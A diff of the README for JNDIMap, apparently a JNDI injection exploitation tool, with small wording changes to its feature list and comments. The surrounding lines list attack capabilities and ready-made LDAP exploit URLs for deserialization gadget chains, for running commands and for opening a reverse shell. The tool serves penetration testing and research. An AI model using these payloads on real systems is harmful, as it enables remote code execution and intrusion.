@@ -1,6 +1,6 @@
 # JNDIMap
 
-JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议
+JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多种高版本 JDK 绕过方式
 
 目前支持以下功能
 
@@ -8,7 +8,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议
 - 命令执行
 - 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
-- Tomcat/Groovy/SnakeYaml RCE
+- Tomcat/Groovy/SnakeYaml Bypass
 - Commons/Tomcat DBCP, Alibaba Druid JDBC RCE
 - NativeLibLoader 加载动态链接库
 - MLet 探测可用 Gadget
@@ -112,7 +112,7 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYS
 # CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
 
-# CommonsBeanutils1NoCC 反序列化 (1.9.4, 无需 commons-collections 依赖), 使用 TemplatesImpl, 支持命令和反弹 Shell
+# CommonsBeanutils1NoCC 反序列化 (1.9.4, 无需 commons-collections 依赖), 使用 TemplatesImpl, 支持命令执行和反弹 Shell
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC/ReverseShell/127.0.0.1/4444
